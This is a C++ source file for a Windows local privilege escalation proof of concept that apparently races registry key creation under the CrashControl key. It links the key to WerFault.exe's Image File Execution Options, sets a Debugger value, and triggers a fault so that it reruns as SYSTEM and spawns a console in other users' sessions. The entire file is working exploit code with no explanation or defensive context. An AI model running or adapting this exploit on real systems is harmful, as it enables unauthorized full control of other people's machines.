#include <iostream>
#define UMDF_USING_NTSTATUS
#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <ktmw32.h>
#include <sddl.h>
#include <conio.h>
#include <ErrorRep.h>
#pragma comment(lib,"ntdll.lib")
#pragma comment(lib,"Faultrep.lib")
#pragma comment(lib,"ktmW32.lib")
#pragma comment(lib,"Ole32.lib")
#pragma comment(lib,"Rpcrt4.lib")

HANDLE hthread = NULL;

typedef  struct _FILE_PROCESS_IDS_USING_FILE_INFORMATION
{
	ULONG NumberOfProcessIdsInList;
	ULONG_PTR ProcessIdList[1];
} FILE_PROCESS_IDS_USING_FILE_INFORMATION, * PFILE_PROCESS_IDS_USING_FILE_INFORMATION;




NTSTATUS(WINAPI* NtCreateKey)(
	OUT PHANDLE             pKeyHandle,
	IN ACCESS_MASK          DesiredAccess,
	IN POBJECT_ATTRIBUTES   ObjectAttributes,
	IN ULONG                TitleIndex,
	IN PUNICODE_STRING      Class OPTIONAL,
	IN ULONG                CreateOptions,
	OUT PULONG              Disposition OPTIONAL);
NTSTATUS(WINAPI* NtSetValueKey)(
	IN HANDLE               KeyHandle,
	IN PUNICODE_STRING      ValueName,
	IN ULONG                TitleIndex OPTIONAL,
	IN ULONG                Type,
	IN PVOID                Data,
	IN ULONG                DataSize);
NTSTATUS(WINAPI* NtResumeThread)(
	IN HANDLE               ThreadHandle,
	OUT PULONG              SuspendCount OPTIONAL);
NTSTATUS(WINAPI* NtSuspendThread)(
	IN HANDLE               ThreadHandle,
	OUT PULONG              PreviousSuspendCount OPTIONAL);
NTSTATUS(WINAPI* NtSetSecurityObject)(
	HANDLE               Handle,
	SECURITY_INFORMATION SecurityInformation,
	PSECURITY_DESCRIPTOR SecurityDescriptor
	);
NTSTATUS(WINAPI* NtDeleteKey)(
	IN HANDLE               KeyHandle);
NTSTATUS(WINAPI* NtOpenKey)(
	OUT PHANDLE             pKeyHandle,
	IN ACCESS_MASK          DesiredAccess,
	IN POBJECT_ATTRIBUTES   ObjectAttributes);
UINT(WINAPI* NtUserRegisterWindowMessage)(
	__in PUNICODE_STRING pstrMessage);
NTSTATUS(WINAPI* NtQueryInformationFile)(
	_In_  HANDLE                 FileHandle,
	_Out_ PIO_STATUS_BLOCK       IoStatusBlock,
	_Out_ PVOID                  FileInformation,
	_In_  ULONG                  Length,
	_In_  FILE_INFORMATION_CLASS FileInformationClass
	);
NTSTATUS(WINAPI* NtNotifyChangeKey)(
	HANDLE           KeyHandle,
	HANDLE           Event,
	PIO_APC_ROUTINE  ApcRoutine,
	PVOID            ApcContext,
	PIO_STATUS_BLOCK IoStatusBlock,
	ULONG            CompletionFilter,
	BOOLEAN          WatchTree,
	PVOID            Buffer,
	ULONG            BufferSize,
	BOOLEAN          Asynchronous
	);

NTSTATUS(WINAPI* NtSetInformationThread)(
	__in HANDLE ThreadHandle,
	__in THREADINFOCLASS ThreadInformationClass,
	__in_bcount(ThreadInformationLength) PVOID ThreadInformation,
	__in ULONG ThreadInformationLength
	);

namespace native {
	typedef enum _THREADINFOCLASS {
		ThreadBasicInformation,
		ThreadTimes,
		ThreadPriority,
		ThreadBasePriority,
		ThreadAffinityMask,
		ThreadImpersonationToken,
		ThreadDescriptorTableEntry,
		ThreadEnableAlignmentFaultFixup,
		ThreadEventPair_Reusable,
		ThreadQuerySetWin32StartAddress,
		ThreadZeroTlsCell,
		ThreadPerformanceCount,
		ThreadAmILastThread,
		ThreadIdealProcessor,
		ThreadPriorityBoost,
		ThreadSetTlsArrayAddress,
		ThreadIsIoPending,
		ThreadHideFromDebugger,
		ThreadBreakOnTermination,
		ThreadSwitchLegacyState,
		ThreadIsTerminated,
		ThreadLastSystemCall,
		ThreadIoPriority,
		ThreadCycleTime,
		ThreadPagePriority,
		ThreadActualBasePriority,
		ThreadTebInformation,
		ThreadCSwitchMon,
		ThreadCSwitchPmu,
		ThreadWow64Context,
		MaxThreadInfoClass
	} THREADINFOCLASS;
	typedef struct _PAGE_PRIORITY_INFORMATION {
		ULONG PagePriority;
	} PAGE_PRIORITY_INFORMATION, * PPAGE_PRIORITY_INFORMATION;
};

#define ATOM_MAX_LENGTH    255

int InitNativeAPI()
{

	LoadLibrary(L"user32.dll");
	HMODULE win32u = LoadLibrary(L"win32u.dll");
	HMODULE hm = LoadLibrary(L"ntdll.dll");
	if (!hm || !win32u)
	{
		printf("Failed to load libraries.");
		ExitProcess(1);
	}
	NtCreateKey = (NTSTATUS(WINAPI*)(
		OUT PHANDLE             pKeyHandle,
		IN ACCESS_MASK          DesiredAccess,
		IN POBJECT_ATTRIBUTES   ObjectAttributes,
		IN ULONG                TitleIndex,
		IN PUNICODE_STRING      Class OPTIONAL,
		IN ULONG                CreateOptions,
		OUT PULONG              Disposition OPTIONAL
		))GetProcAddress(hm, "NtCreateKey");
	NtSetValueKey = (NTSTATUS(WINAPI*)(
		IN HANDLE               KeyHandle,
		IN PUNICODE_STRING      ValueName,
		IN ULONG                TitleIndex OPTIONAL,
		IN ULONG                Type,
		IN PVOID                Data,
		IN ULONG                DataSize))GetProcAddress(hm, "NtSetValueKey");
	NtResumeThread = (NTSTATUS(WINAPI*)(
		IN HANDLE               ThreadHandle,
		OUT PULONG              SuspendCount OPTIONAL))GetProcAddress(hm, "NtResumeThread");
	NtSuspendThread = (NTSTATUS(WINAPI*)(
		IN HANDLE               ThreadHandle,
		OUT PULONG              PreviousSuspendCount OPTIONAL))GetProcAddress(hm, "NtSuspendThread");
	NtSetSecurityObject = (NTSTATUS(WINAPI*)(
		HANDLE               Handle,
		SECURITY_INFORMATION SecurityInformation,
		PSECURITY_DESCRIPTOR SecurityDescriptor
		))GetProcAddress(hm, "NtSetSecurityObject");
	NtDeleteKey = (NTSTATUS(WINAPI*)(
		IN HANDLE               KeyHandle))GetProcAddress(hm, "NtDeleteKey");
	NtOpenKey = (NTSTATUS(WINAPI*)(
		OUT PHANDLE             pKeyHandle,
		IN ACCESS_MASK          DesiredAccess,
		IN POBJECT_ATTRIBUTES   ObjectAttributes))GetProcAddress(hm, "NtOpenKey");
	NtUserRegisterWindowMessage = (UINT(WINAPI*)(__in PUNICODE_STRING pstrMessage))GetProcAddress(win32u, "NtUserRegisterWindowMessage");
	NtQueryInformationFile = (NTSTATUS(WINAPI*)(
		_In_  HANDLE                 FileHandle,
		_Out_ PIO_STATUS_BLOCK       IoStatusBlock,
		_Out_ PVOID                  FileInformation,
		_In_  ULONG                  Length,
		_In_  FILE_INFORMATION_CLASS FileInformationClass
		))GetProcAddress(hm, "NtQueryInformationFile");
	NtNotifyChangeKey = (NTSTATUS(WINAPI*)(
		HANDLE           KeyHandle,
		HANDLE           Event,
		PIO_APC_ROUTINE  ApcRoutine,
		PVOID            ApcContext,
		PIO_STATUS_BLOCK IoStatusBlock,
		ULONG            CompletionFilter,
		BOOLEAN          WatchTree,
		PVOID            Buffer,
		ULONG            BufferSize,
		BOOLEAN          Asynchronous
		))GetProcAddress(hm, "NtNotifyChangeKey");
	NtSetInformationThread = (NTSTATUS(WINAPI*)(
		HANDLE ThreadHandle,
		THREADINFOCLASS ThreadInformationClass,
		PVOID ThreadInformation,
		ULONG ThreadInformationLength
		))GetProcAddress(hm, "NtSetInformationThread");
	return 0;

}

BOOL IsLocalSystem()
{
	HANDLE hToken;
	UCHAR bTokenUser[sizeof(TOKEN_USER) + 8 + 4 * SID_MAX_SUB_AUTHORITIES] = { 0 };
	PTOKEN_USER pTokenUser = (PTOKEN_USER)bTokenUser;
	ULONG cbTokenUser;
	SID_IDENTIFIER_AUTHORITY siaNT = SECURITY_NT_AUTHORITY;
	PSID pSystemSid;
	BOOL bSystem;

	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_QUERY,
		&hToken))
		return FALSE;

	if (!GetTokenInformation(hToken, TokenUser, pTokenUser,
		sizeof(bTokenUser), &cbTokenUser))
	{
		CloseHandle(hToken);
		return FALSE;
	}

	CloseHandle(hToken);

	if (!AllocateAndInitializeSid(&siaNT, 1, SECURITY_LOCAL_SYSTEM_RID,
		0, 0, 0, 0, 0, 0, 0, &pSystemSid))
		return FALSE;

	bSystem = EqualSid(pTokenUser->User.Sid, pSystemSid);

	FreeSid(pSystemSid);

	return bSystem;
}
bool DoCreateShellInProcessSession(DWORD pid)
{
	DWORD sesid = 0;
	if (!ProcessIdToSessionId(pid, &sesid))
		return false;

	HANDLE htoken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &htoken))
		return false;
	HANDLE dup = NULL;
	bool ret = DuplicateTokenEx(htoken, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &dup);
	CloseHandle(htoken);
	if (!ret)
		return false;
	if (!SetTokenInformation(dup, TokenSessionId, &sesid, sizeof(sesid)))
	{
		CloseHandle(dup);
		return false;
	}
	STARTUPINFO si = { 0 };
	si.cb = sizeof(si);
	si.lpDesktop = (LPWSTR)L"WinSta0\\Default";
	PROCESS_INFORMATION pi = { 0 };

	wchar_t sysdir[MAX_PATH] = { 0 };
	if (!GetSystemDirectoryW(sysdir, MAX_PATH))
		return false;

	wchar_t path[MAX_PATH] = { 0 };
	wcscat_s(path, sysdir);
	wcscat_s(path, L"\\");
	wcscat_s(path, L"conhost.exe");

	ret = CreateProcessAsUser(dup, path, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
	CloseHandle(dup);
	if (pi.hProcess)
		CloseHandle(pi.hProcess);
	if (pi.hThread)
		CloseHandle(pi.hThread);


	return ret;
}

bool premain()
{
	InitNativeAPI();


	if (!IsLocalSystem())
		return false;
	HKEY hk = NULL;
	LSTATUS st = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\WerFault.exe", NULL, KEY_SET_VALUE | DELETE, &hk);
	wchar_t sysdir[MAX_PATH] = { 0 };
	if (!GetSystemDirectoryW(sysdir, MAX_PATH))
		return false;
	wchar_t md2[MAX_PATH] = { 0 };
	wcscat_s(md2, sysdir);
	wcscat_s(md2, L"\\");
	wcscat_s(md2, L"winlogon.exe");
	
	RegSetValueEx(hk, L"Debugger", NULL, REG_SZ, (LPBYTE)md2, lstrlen(md2) * sizeof(wchar_t));
	CloseHandle(hk);
	wchar_t md[MAX_PATH] = { 0 };
	GetModuleFileName(GetModuleHandle(NULL), md, MAX_PATH);
	HANDLE h = CreateFile(md, FILE_READ_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!h || h == INVALID_HANDLE_VALUE)
		ExitProcess(GetLastError());
	IO_STATUS_BLOCK iostat = { 0 };
	PFILE_PROCESS_IDS_USING_FILE_INFORMATION pids = (PFILE_PROCESS_IDS_USING_FILE_INFORMATION)new char[0x1000];
	NTSTATUS stat = NtQueryInformationFile(h, &iostat, pids, 0x1000, (FILE_INFORMATION_CLASS)47);
	CloseHandle(h);
	if (!NT_SUCCESS(stat))
		ExitProcess(RtlNtStatusToDosError(stat));
	if (pids->NumberOfProcessIdsInList <= 1)
	{
		ExitProcess(ERROR_NOT_FOUND);
	}
	USHORT index = 0;

	do {
		DWORD sesid = 0;
		USHORT cur = index++;
		ProcessIdToSessionId((DWORD)pids->ProcessIdList[cur], &sesid);
		if (pids->ProcessIdList[cur] == GetCurrentProcessId() || sesid == 0)
			continue;
		DoCreateShellInProcessSession((DWORD)pids->ProcessIdList[cur]);
	} while (pids->NumberOfProcessIdsInList--);

	delete[] pids;
	ExitProcess(UINT_MAX);
	return true;
}

bool initialize = premain();

int filter(int code, PEXCEPTION_POINTERS ex) {
	return EXCEPTION_EXECUTE_HANDLER;
}

DWORD SpawnShell()
{
	HKEY hk = NULL;
	LSTATUS st = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\WerFault.exe", NULL, KEY_SET_VALUE | DELETE, &hk);
	if (!hk || hk == INVALID_HANDLE_VALUE) {
		return st;
	}
	wchar_t md[MAX_PATH] = { 0 };
	GetModuleFileName(GetModuleHandle(NULL), md, MAX_PATH);
	RegSetValueEx(hk, L"Debugger", NULL, REG_SZ, (LPBYTE)md, lstrlen(md) * sizeof(wchar_t));
	EXCEPTION_POINTERS ep = { 0 };
	__try {
		ReportFault(&ep, NULL);
	}
	__except (filter(GetExceptionCode(), GetExceptionInformation()))
	{
	}
	RegDeleteValue(hk, L"Debugger");
	RegCloseKey(hk);

	return ERROR_SUCCESS;

}



DWORD WINAPI CallerThread(void*)
{
	FILE_IO_PRIORITY_HINT_INFO prhi = {};
	prhi.PriorityHint = IoPriorityHintVeryLow;
	native::PAGE_PRIORITY_INFORMATION pri = { 0 };
	pri.PagePriority = 0x1;
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_IDLE);
	SetThreadPriorityBoost(GetCurrentThread(), TRUE);
	NtSetInformationThread(GetCurrentThread(), (THREADINFOCLASS)native::ThreadIoPriority, &prhi, sizeof(prhi));
	NtSetInformationThread(GetCurrentThread(), (THREADINFOCLASS)native::ThreadPagePriority, &pri, sizeof(prhi));
	//Sleep(100);// give some time for other threads to initialize
	wchar_t atom[ATOM_MAX_LENGTH + 1] = { 0 };
	wmemset(atom, L'0', ATOM_MAX_LENGTH);
	atom[0] = L'#';
	UNICODE_STRING unistr = { 0 };
	RtlInitUnicodeString(&unistr, atom);
	NtUserRegisterWindowMessage(&unistr);
	return ERROR_SUCCESS;
}

HANDLE CreateLockFile()
{
	int ignored = 0;
	IO_STATUS_BLOCK iostat = { 0 };
	OBJECT_ATTRIBUTES objattr = { 0 };
	ULARGE_INTEGER FreeBytesAvailableToCaller = { 0 };
	ULARGE_INTEGER TotalNumberOfBytes = { 0 };
	ULARGE_INTEGER TotalNumberOfFreeBytes = { 0 };
	LARGE_INTEGER FreeBytesAvailableToCaller2 = { 0 };
	wchar_t FileToAllocate[MAX_PATH] = { 0 };
	wchar_t* _guid = 0;
	GUID guid = { 0 };
	HANDLE hfile = NULL;
	wchar_t tmp[MAX_PATH] = { 0 };
	ignored = CoCreateGuid(&guid);
	ignored = StringFromCLSID(guid, &_guid);
	lstrcpyW(tmp, L"\\??\\%TEMP%\\");
	lstrcatW(tmp, _guid);
	ExpandEnvironmentStrings(tmp, FileToAllocate, MAX_PATH);
	CoTaskMemFree(_guid);
	GetDiskFreeSpaceEx(L"C:\\", &FreeBytesAvailableToCaller, &TotalNumberOfBytes, &TotalNumberOfFreeBytes);
	UNICODE_STRING UnicodeFileToAllocate = { 0 };
	RtlInitUnicodeString(&UnicodeFileToAllocate, FileToAllocate);
	GetDiskFreeSpaceEx(L"C:\\", &FreeBytesAvailableToCaller, &TotalNumberOfBytes, &TotalNumberOfFreeBytes);
	FreeBytesAvailableToCaller2.QuadPart = (LONGLONG)FreeBytesAvailableToCaller.QuadPart;

	InitializeObjectAttributes(&objattr, &UnicodeFileToAllocate, OBJ_CASE_INSENSITIVE, NULL, NULL);
	NTSTATUS status = NtCreateFile(&hfile, GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE, &objattr, &iostat, &FreeBytesAvailableToCaller2, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_CREATE, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_DELETE_ON_CLOSE, NULL, NULL);
	if (!NT_SUCCESS(status))
	{
		printf("Failed to allocate entire disk space, status : 0x%0.8X\n", status);
		return NULL;
	}
	SetFileInformationByHandle(hfile, FileEndOfFileInfo, &FreeBytesAvailableToCaller2, sizeof(FreeBytesAvailableToCaller2));
	SetFilePointerEx(hfile, FreeBytesAvailableToCaller2, NULL, FILE_BEGIN);
	return hfile;

}



int main()
{
	DWORD shellret = 0;
	HANDLE keyhandle = NULL;
	HANDLE childkey = NULL;
	HANDLE NotifyEvent = NULL;
	HANDLE hCallerThread = NULL;
	HANDLE hfile = NULL;
	HANDLE hTargetKey = NULL;
	HANDLE hthread2 = NULL;
	HANDLE busykey = NULL;
	ULONG disp = NULL;
	IO_STATUS_BLOCK iostat = { 0 };
	OBJECT_ATTRIBUTES objattr = { 0 };
	HANDLE WaitObjects[2] = { 0 };
	DWORD tid = 0;
	UNICODE_STRING CrashControlName = { 0 };
	RtlInitUnicodeString(&CrashControlName, L"\\REGISTRY\\MACHINE\\System\\CurrentControlSet\\Control\\CrashControl");
	InitializeObjectAttributes(&objattr, &CrashControlName, OBJ_CASE_INSENSITIVE, NULL, NULL);
	wchar_t target[MAX_PATH] = { 0 };
	SYSTEMTIME systemtime = { 0 };
	UNICODE_STRING _target = { 0 };
	UNICODE_STRING ValueName = { 0 };
	wchar_t KeyValue[] = L"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\WerFault.exe";
	wchar_t TargetKeyCreation[MAX_PATH] = { 0 };
	lstrcpyW(TargetKeyCreation, KeyValue);
	lstrcatW(TargetKeyCreation, L"\\.lock");


	NTSTATUS status = NtOpenKey(&keyhandle, KEY_READ, &objattr);
	if (!NT_SUCCESS(status))
	{
		printf("Error opening the crash control key, status : 0x%0.8X", status);
		return 1;
	}

	NotifyEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	status = NtNotifyChangeKey(keyhandle, NotifyEvent, NULL, NULL, &iostat, REG_NOTIFY_CHANGE_NAME | REG_NOTIFY_THREAD_AGNOSTIC, TRUE, NULL, NULL, TRUE);
	if (status != STATUS_PENDING)
	{
		printf("Unable to register key notification, status : 0x%0.8X", status);
		goto cleanup;
	}
	printf("Notification was set on %ws\n", objattr.ObjectName->Buffer);
	printf("Waiting for notification to be triggered.\n");
	hCallerThread = CreateThread(NULL, NULL, CallerThread, NULL, NULL, &tid);
	if (!hCallerThread)
	{
		printf("Failed to create syscall thread.");
		goto cleanup;
	}

	WaitObjects[0] = hCallerThread;
	WaitObjects[1] = NotifyEvent;
	if ((WaitForMultipleObjects(2, WaitObjects, FALSE, INFINITE) - WAIT_OBJECT_0) == 0)
	{
		printf("PoC failed, step 1\n");
		goto cleanup;
	}
	NtSuspendThread(hCallerThread, NULL);
	printf("Notification triggered.\n");
	hfile = CreateLockFile();
	if (!hfile)
	{
		printf("Failed to create locking file.");
		goto cleanup;
	}
	printf("Lock file created.\n");
	printf("Attempting to lock win32kbase error key...\n");
	GetLocalTime(&systemtime);
	wsprintf(target, L"FullLiveKernelReports\\win32kbase.sys\\win32kbase.sys-%0.4d%0.2d%0.2d-%0.2d%0.2d.dmp\\.lock", systemtime.wYear, systemtime.wMonth, systemtime.wDay, systemtime.wHour, systemtime.wMinute);
	RtlInitUnicodeString(&_target, target);
	InitializeObjectAttributes(&objattr, &_target, OBJ_CASE_INSENSITIVE, keyhandle, NULL);

	while (1) {
		status = NtCreateKey(&childkey, KEY_ALL_ACCESS, &objattr, NULL, NULL, NULL, &disp);
		if (status == STATUS_OBJECT_NAME_NOT_FOUND || status == STATUS_OBJECT_PATH_NOT_FOUND)
			continue;
		if (!NT_SUCCESS(status))
		{
			printf("Failed to lock registry key, error : 0x%0.8X", status);
			goto cleanup;
		}
		else
			break;
	}
	printf("done.\n");
	Sleep(100);
	printf("Waiting for the busy key to be removed.\n");
	GetLocalTime(&systemtime);
	wsprintf(target, L"FullLiveKernelReports\\win32kbase.sys\\win32kbase.sys-%0.4d%0.2d%0.2d-%0.2d%0.2d.dmp\\Busy", systemtime.wYear, systemtime.wMonth, systemtime.wDay, systemtime.wHour, systemtime.wMinute);
	RtlInitUnicodeString(&_target, target);
	InitializeObjectAttributes(&objattr, &_target, OBJ_CASE_INSENSITIVE, keyhandle, NULL);
	do {
		Sleep(100);
		status = NtCreateKey(&busykey, KEY_ALL_ACCESS, &objattr, NULL, NULL, REG_OPTION_CREATE_LINK, &disp);
		if (status != STATUS_OBJECT_NAME_COLLISION && !NT_SUCCESS(status))
		{
			printf("Failed to re-open \"busy\" registry key, error : 0x%0.8X", status);
			goto cleanup;
		}
	} while (status);
	printf("Done, succesfully re-created %ws\n", objattr.ObjectName->Buffer);

	NtClose(hfile);
	hfile = NULL;
	status = NtDeleteKey(childkey);
	if (!NT_SUCCESS(status) || NtDeleteKey(busykey))
	{
		printf("Failed to cleanup registry.\n");
		goto cleanup;
	}
	NtClose(childkey);
	childkey = NULL;
	NtClose(busykey);
	busykey = NULL;
	printf("Removed newly created keys.\n");
	wsprintf(target, L"FullLiveKernelReports\\win32kbase.sys\\win32kbase.sys-%0.4d%0.2d%0.2d-%0.2d%0.2d.dmp", systemtime.wYear, systemtime.wMonth, systemtime.wDay, systemtime.wHour, systemtime.wMinute);
	RtlInitUnicodeString(&_target, target);
	InitializeObjectAttributes(&objattr, &_target, OBJ_CASE_INSENSITIVE, keyhandle, NULL);
	status = NtOpenKey(&childkey, KEY_ALL_ACCESS, &objattr);
	if (!NT_SUCCESS(status))
	{
		printf("Failed to delete target registry key, error : 0x%0.8X", status);
		goto cleanup;
	}
	NtDeleteKey(childkey);
	NtClose(childkey);
	printf("Removed %ws\n", objattr.ObjectName->Buffer);
	childkey = NULL;
	RtlInitUnicodeString(&ValueName, L"SymbolicLinkValue");

	status = NtCreateKey(&childkey, KEY_ALL_ACCESS, &objattr, NULL, NULL, REG_OPTION_CREATE_LINK, &disp);
	if (!NT_SUCCESS(status))
	{
		printf("Failed to re-create target registry key, error : 0x%0.8X", status);
		goto cleanup;
	}
	printf("Re-created : %ws\n", objattr.ObjectName->Buffer);
	status = NtSetValueKey(childkey, &ValueName, NULL, REG_LINK, KeyValue, sizeof(KeyValue) - 2);
	if (!NT_SUCCESS(status))
	{
		printf("Failed to set symbolic link value, status : 0x%0.8X", status);
		goto cleanup;
	}
	printf("%ws was set.\n", ValueName.Buffer);
	hthread2 = CreateThread(NULL, NULL, CallerThread, NULL, NULL, &tid);
	if (!hthread2)
	{
		printf("Failed to create second worker thread, error : %d\n", GetLastError());
		goto cleanup;
	}
	printf("Succesfully created second worker thread.\n");
	printf("Waiting for the target key to be created.\n");
	RtlInitUnicodeString(&_target, TargetKeyCreation);
	InitializeObjectAttributes(&objattr, &_target, OBJ_CASE_INSENSITIVE, NULL, NULL);
	do {
		status = NtCreateKey(&hTargetKey, KEY_ALL_ACCESS, &objattr, NULL, NULL, NULL, &disp);
	} while (status);

	NtDeleteKey(childkey);
	NtClose(childkey);
	childkey = NULL;
	hfile = CreateLockFile();

	WaitForSingleObject(hthread2, INFINITE);
	NtClose(hthread2);
	hthread2 = NULL;



	printf("Attempting to spawn shell...\n");
	shellret = SpawnShell();
	if (shellret)
	{
		printf("Failed to spawn shell.\n");
		goto cleanup;
	}
	printf("Shell should've been spawned.\n");
	Sleep(1000);

cleanup:

	if (hTargetKey)
	{
		NtDeleteKey(hTargetKey);
		NtClose(hTargetKey);
	}
	if (hfile)
		NtClose(hfile);
	NtClose(NotifyEvent);
	if (keyhandle)
		NtClose(keyhandle);
	if (childkey) {
		NtDeleteKey(childkey);
		NtClose(childkey);
	}
	if (busykey)
	{
		NtDeleteKey(busykey);
		NtClose(busykey);
	}
	if (hthread2)
	{
		TerminateThread(hthread2, ERROR_SUCCESS);
		NtClose(hthread2);
	}
	if (hCallerThread)
	{
		TerminateThread(hCallerThread, ERROR_SUCCESS);
		NtClose(hCallerThread);
	}
	RegDeleteTree(HKEY_LOCAL_MACHINE, L"System\\CurrentControlSet\\Control\\CrashControl\\FullLiveKernelReports");
	RegDeleteTree(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\WerFault.exe");
	return 0;
}
